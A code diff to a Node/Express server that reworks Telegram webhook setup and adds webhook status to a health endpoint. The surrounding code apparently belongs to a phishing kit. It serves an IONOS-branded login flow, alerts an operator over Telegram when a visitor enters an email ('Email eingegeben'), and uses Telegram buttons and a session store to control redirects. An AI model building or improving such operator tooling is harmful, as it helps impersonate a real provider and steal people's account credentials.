@@ -121,14 +121,25 @@ async function handleTelegramCallback(callbackQuery) {
   await answerTelegramCallback(callbackQuery.id, labels[parsed.action] || "OK");
 }
 
+function getTelegramWebhookBase() {
+  if (process.env.TELEGRAM_WEBHOOK_URL) {
+    return process.env.TELEGRAM_WEBHOOK_URL.replace(/\/$/, "");
+  }
+  if (process.env.VERCEL_PROJECT_PRODUCTION_URL) {
+    return `https://${process.env.VERCEL_PROJECT_PRODUCTION_URL.replace(/^https?:\/\//, "")}`;
+  }
+  if (process.env.VERCEL_URL) {
+    return `https://${process.env.VERCEL_URL}`;
+  }
+  return null;
+}
+
 async function setupTelegramWebhook() {
   const token = process.env.TELEGRAM_BOT_TOKEN;
-  if (!token) return;
+  if (!token) return { ok: false, error: "no_token" };
 
-  const base =
-    process.env.TELEGRAM_WEBHOOK_URL ||
-    (process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : null);
-  if (!base) return;
+  const base = getTelegramWebhookBase();
+  if (!base) return { ok: false, error: "no_base_url" };
 
   const webhookUrl = `${base.replace(/\/$/, "")}/api/telegram/webhook`;
   const res = await fetch(`https://api.telegram.org/bot${token}/setWebhook`, {
@@ -139,9 +150,31 @@ async function setupTelegramWebhook() {
   const data = await res.json().catch(() => ({}));
   if (data.ok) {
     console.log("[telegram] Webhook set:", webhookUrl);
-  } else {
-    console.error("[telegram] Webhook failed:", data.description || res.statusText);
+    return { ok: true, url: webhookUrl };
   }
+  console.error("[telegram] Webhook failed:", data.description || res.statusText);
+  return { ok: false, error: data.description || "request_failed", url: webhookUrl };
+}
+
+function setupTelegramWebhookAsync() {
+  setupTelegramWebhook().catch((err) => console.error("[telegram webhook]", err.message));
+}
+
+async function getTelegramWebhookInfo() {
+  const token = process.env.TELEGRAM_BOT_TOKEN;
+  if (!token) return { configured: false };
+  const res = await fetch(`https://api.telegram.org/bot${token}/getWebhookInfo`);
+  const data = await res.json().catch(() => ({}));
+  if (!data.ok) return { configured: true, ok: false };
+  return {
+    configured: true,
+    ok: true,
+    url: data.result?.url || "",
+    pending: data.result?.pending_update_count || 0,
+    expected: getTelegramWebhookBase()
+      ? `${getTelegramWebhookBase().replace(/\/$/, "")}/api/telegram/webhook`
+      : null,
+  };
 }
 
 async function clearTelegramWebhook() {
@@ -370,12 +403,14 @@ app.get("/ionos-flow.js", (_req, res) => {
 
 app.get("/health", async (_req, res) => {
   const supabasePing = await pingSupabase();
+  const telegramWebhook = await getTelegramWebhookInfo();
   res.json({
     ok: true,
-    version: 4,
+    version: 5,
     sessionStore: getStoreMode(),
     supabase: Boolean(process.env.SUPABASE_URL && process.env.SUPABASE_SERVICE_ROLE_KEY),
     supabasePing,
+    telegramWebhook,
     commit: process.env.VERCEL_GIT_COMMIT_SHA || "local",
   });
 });
@@ -396,6 +431,7 @@ app.post("/api/ionos/start", async (req, res) => {
     });
 
     notifyFlowSessionAsync(session, "📧 IONOS — Email eingegeben");
+    setupTelegramWebhookAsync();
 
     return res.json({ ok: true, sessionId: session.id, store: getStoreMode() });
   } catch (err) {
@@ -549,13 +585,19 @@ if (process.env.VERCEL !== "1") {
       console.warn("[ionos] Using memory store — add Supabase (free) for Vercel redirects");
     }
     if (process.env.TELEGRAM_BOT_TOKEN) {
-      await clearTelegramWebhook();
-      pollTelegramUpdates();
-      console.log("[telegram] Callback polling started");
+      if (process.env.TELEGRAM_USE_POLLING === "true" && getStoreMode() === "memory") {
+        await clearTelegramWebhook();
+        pollTelegramUpdates();
+        console.log("[telegram] Local polling mode (memory store only)");
+      } else {
+        console.log(
+          "[telegram] Webhook not changed locally — use Vercel for Telegram buttons, or set TELEGRAM_USE_POLLING=true for local-only tests"
+        );
+      }
     }
   });
 } else {
-  setupTelegramWebhook().catch((err) => console.error("[telegram webhook]", err.message));
+  setupTelegramWebhookAsync();
 }
 
 module.exports = app;
